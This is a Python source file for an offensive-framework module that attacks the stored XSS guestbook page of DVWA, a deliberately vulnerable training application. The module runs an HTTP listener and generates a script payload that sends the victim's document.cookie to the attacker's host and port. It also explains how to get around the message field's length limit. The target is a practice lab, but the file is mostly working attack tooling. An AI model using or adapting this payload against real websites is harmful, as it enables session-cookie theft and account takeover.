"""
modules/xss/xss_stored.py
DVWA Stored XSS — cookie stealer via guestbook injection
"""

import socket
import subprocess
import webbrowser
from base_module import BaseModule
from utils import colored


class DVWAStoredXSS(BaseModule):
    def __init__(self):
        super().__init__()
        self.name        = "dvwa_xss_stored"
        self.description = "DVWA Stored XSS — inject cookie-stealer script into guestbook"

        self.options = {
            "RHOST": {"value": "",                    "required": True,  "description": "Target DVWA IP or hostname"},
            "LHOST": {"value": self._get_local_ip(),  "required": True,  "description": "Your IP for the catch server"},
            "LPORT": {"value": "8080",                "required": True,  "description": "HTTP server listen port"},
        }

        self._server_proc = None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ------------------------------------------------------------------
    # Help
    # ------------------------------------------------------------------
    def show_help(self):
        print(colored("\n=== DVWA Stored XSS Module ===", "orange"))
        print(self.description)
        print("\nWorkflow:")
        print("  1. set RHOST / LHOST / LPORT")
        print("  2. setup    → start HTTP catch server + open Stored XSS page")
        print("  3. generate → print the guestbook payload")
        print("  4. Paste payload into the Message field, submit, then refresh the page")
        print("\nNote: you may need to increase the Message maxlength via browser DevTools")
        print("\nCommands:")
        print("  setup                - Start HTTP server and open DVWA stored XSS page")
        print("  generate             - Generate the stored XSS cookie-steal payload")
        print("  set <option> <value> - Set an option")
        print("  show options         - Show current settings")
        print("  back / exit          - Return to framework (stops HTTP server)\n")

    # ------------------------------------------------------------------
    # Command dispatcher
    # ------------------------------------------------------------------
    def handle_command(self, cmd_input: str):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) == 3:
                self.set_option(parts[1], parts[2])
            else:
                print("Usage: set <option> <value>")
            return

        if low == "setup":
            self._start_server()
            self._open_dvwa_page()
            return

        if low == "generate":
            self._generate_payload()
            return

        if low in ["back", "exit", "quit"]:
            self._stop_server()
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def run(self):
        self._start_server()
        self._open_dvwa_page()

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------
    def _start_server(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        cmd   = f"python3 -m http.server {lport}"
        print(colored(f"[*] Starting HTTP server on {lhost}:{lport} ...", "yellow"))

        for terminal in (
            ["gnome-terminal", "--", "bash", "-c", cmd + "; echo 'Press Enter to close...'; read"],
            ["xterm", "-e", cmd],
        ):
            try:
                self._server_proc = subprocess.Popen(terminal)
                print(colored("[+] HTTP server started.", "green"))
                return
            except FileNotFoundError:
                continue

        print(colored(f"[-] Could not open terminal. Run manually:\n    {cmd}", "red"))

    def _stop_server(self):
        if self._server_proc:
            self._server_proc.terminate()
            self._server_proc = None

    def _open_dvwa_page(self):
        rhost = self.options["RHOST"]["value"]
        url   = f"http://{rhost}/vulnerabilities/xss_s/"
        print(colored(f"[+] Opening {url}", "yellow"))
        webbrowser.open(url)

    def _generate_payload(self):
        lhost   = self.options["LHOST"]["value"]   # ← was hardcoded before, now uses set value
        lport   = self.options["LPORT"]["value"]
        payload = (
            f"<script>new Image().src='http://{lhost}:{lport}/?cookie='"
            f"+encodeURIComponent(document.cookie);</script>"
        )

        print(colored("\n=== Stored XSS Cookie-Steal Payload ===", "orange"))
        print("Paste into the Message field in DVWA Guestbook → Submit → Refresh page")
        print(colored("Tip: right-click the Message field → Inspect → change maxlength to 300+", "yellow"))
        print(colored("=" * 80, "yellow"))
        print(payload)
        print(colored("=" * 80, "yellow"))
        print(colored("\nRefresh the Guestbook page — check HTTP server terminal for cookies.\n", "yellow"))

        self._copy_to_clipboard(payload)

    @staticmethod
    def _copy_to_clipboard(text: str):
        try:
            subprocess.run(["xclip", "-sel", "clip"], input=text.encode(), check=True)
            print(colored("[+] Payload copied to clipboard.", "green"))
        except Exception:
            print(colored("[*] Copy the payload above manually.", "yellow"))
